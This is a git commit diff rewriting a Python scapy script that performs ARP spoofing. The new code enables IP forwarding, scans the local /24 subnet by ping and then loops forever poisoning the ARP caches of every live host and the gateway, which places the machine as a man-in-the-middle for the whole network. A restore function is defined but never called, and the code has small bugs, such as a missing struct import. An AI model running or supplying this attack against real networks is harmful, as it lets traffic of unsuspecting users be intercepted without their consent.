c2aa53a6bf170cefafb0421060b3caa452bc9306
Georgy Gusev <32247640+GooseBumpsOS@users.noreply.github.com>
2022-10-09 02:14:36 +0300

    Переписал скрипт

--- lastScript.py
+++ lastScript.py
@@ -1,103 +1,148 @@
-# -*- coding: utf-8 -*-
-
-import scapy.all as scapy
+from scapy.all import Ether, ARP, srp, send
 import argparse
 import socket
 import time
+import os
+import sys
+import subprocess
+import multiprocessing.dummy
+import multiprocessing
 
-ip_up_list = []
-self_ip_global = '';
+def diff(first, second):
+        second = set(second)
+        return [item for item in first if item not in second]
 
-def get_self_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    self_ip_global = s.getsockname()[0]
-    return s.getsockname()[0]
-    s.close()
+def get_gateway():
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                # If not default route or not RTF_GATEWAY, skip it
+                continue
 
-def get_mac(ip):
-    try:
-        arp_request = scapy.ARP(pdst=ip)
-        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast/arp_request
-        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-        return answered_list[0][1].hwsrc
-
-    except BaseException:
-        print('Smth wrong')
-
-def spoof():
-    # target_mac = get_mac(target_ip)
-    gateway = get_masc() + str(1)
-    packet = scapy.ARP(op=2, psrc=gateway, hwsrc="f4:a3:af:11:12:44",
-                       hwdst='0.0.0.0', pdst="ff:ff:ff:ff:ff:ff")
-    scapy.send(packet, verbose=False)
-
-
-    #target_ip => my computer
-    #spoof_ip => router ip
-    #мы отправляем пакет на spoof_ip с парой 'target_ip' : target_mac
+            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
 
 def get_masc(): #получение gateway
-    self_ip = get_self_ip().split('.')
+    self_ip = get_gateway().split('.')
     self_ip = self_ip[0] + '.' + self_ip[1] + '.' + self_ip[2] + '.'
 
     return self_ip
 
-# def get_list_of_mac_adress():
-#     mac_list = []
-#     my_ip = get_self_ip()
-#
-#     if not ip_up_list:
-#         get_all_up_ip()
-#
-#     for ip in ip_up_list:
-#         if ip == 'my_ip':
-#             continue
-#         try:
-#             mac_list.append(get_mac(ip))
-#         except BaseException:
-#             print('Smth wrong')
-#             continue
-#
-#     return mac_list
+def enable_ip_route(verbose=True):
+    """
+    Enables IP forwarding
+    """
+    if verbose:
+        print("[!] Enabling IP Routing...")
+    file_path = "/proc/sys/net/ipv4/ip_forward"
+    with open(file_path) as f:
+        if f.read() == 1:
+            # already enabled
+            return
+    with open(file_path, "w") as f:
+        print(1, file=f)
+    if verbose:
+        print("[!] IP Routing enabled.")
 
-def get_all_ip_list():
-    ip = []
+
+def get_mac(ip):
+    """
+    Returns MAC address of any device connected to the network
+    If ip is down, returns None instead
+    """
+    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+    if ans:
+        return ans[0][1].src
+
+def get_self_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    return s.getsockname()[0]
+
+def ip4_addresses():
+    ips = []
     masc = get_masc()
+    for i in range(1, 255):
+        ips.append(masc + str(i))
 
-    for i in range(2,256):
-        ip.append(masc + str(i))
+    print("Try find all available ips")
 
-    return ip
+    return list(filter(lambda ip: ip is not None, ping_range(ips)))
 
-# def get_all_up_ip(): #получить все ip адреса сети по маске
-#     TIMEOUT = 1
-#     conf.verb = 0
-#     for ip in range(0, 5): #256
-#         packet = scapy.IP(dst= get_masc() + str(ip), ttl=20)/scapy.ICMP()
-#         reply = scapy.sr1(packet, timeout=TIMEOUT)
-#         if not (reply is None):
-#               ip_up_list.append(get_masc() + str(ip))
-#               print("New up IP " + get_masc() + str(ip) +" Loop count: " + str(ip))
-#         else:
-#               print("Loop count: " + str(ip))
+def spoof(target_ip, host_ip, verbose=True):
+    """
+    Spoofs `target_ip` saying that we are `host_ip`.
+    it is accomplished by changing the ARP cache of the target (poisoning)
+    """
+    # get the mac address of the target
+    target_mac = get_mac(target_ip)
+    # craft the arp 'is-at' operation packet, in other words; an ARP response
+    # we don't specify 'hwsrc' (source MAC address)
+    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
+    # send the packet
+    # verbose = 0 means that we send the packet without printing any thing
+    send(arp_response, verbose=0)
+    if verbose:
+        # get the MAC address of the default interface we are using
+        self_mac = ARP().hwsrc
+        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 
 
-id = 0
-while True:
-    spoof()
-    print('Пакет ' + str(id))
-    id = id + 1
-    time.sleep(1)
+def restore(target_ip, host_ip, verbose=True):
+    """
+    Restores the normal process of a regular network
+    This is done by sending the original informations
+    (real IP and MAC of `host_ip` ) to `target_ip`
+    """
+    # get the real MAC address of target
+    target_mac = get_mac(target_ip)
+    # get the real MAC address of spoofed (gateway, i.e router)
+    host_mac = get_mac(host_ip)
+    # crafting the restoring packet
+    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
+    # sending the restoring packet
+    # to restore the network to its normal process
+    # we send each reply seven times for a good measure (count=7)
+    send(arp_response, verbose=0, count=7)
+    if verbose:
+        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
 
-# ip = get_all_ip_list()
-# gateway = get_masc() + '1'
-# while 1:
-#     for k in ip:
-#         spoof(gateway, k)
-#         print(k)
+def ping_range(ips):
+    num_threads = 2 * multiprocessing.cpu_count()
+    p = multiprocessing.dummy.Pool(num_threads)
+    results = p.map(ping, ips)
+    p.close()
+    p.join()
 
-#get list of ip adress or take by mask /24 +++
-#get mac of all ip adress
-#change arp table at router for all ip adress by mac
+    return results
+
+def ping(ip):
+    ret = os.system("ping -q -c 1 -W 1 " + ip)
+    if ret == 0:
+        return ip
+    else:
+        return None
+
+def spoof_all(targets, host, verbose=False):
+
+    while True:
+        for target in targets:
+            print("Spoof " + target)
+            spoof(target, host, verbose)
+            spoof(host, target, verbose)
+            time.sleep(1)
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="ARP spoof script")
+    parser.add_argument("-v", "--verbose", action="store_true", help="verbosity, default is True (simple message each second)")
+    args = parser.parse_args()
+    verbose = args.verbose
+
+    enable_ip_route()
+
+    host = get_gateway()
+    exclude = [get_self_ip(), host]
+
+    targets = diff(ip4_addresses(), exclude)
+    spoof_all(targets, host, verbose)
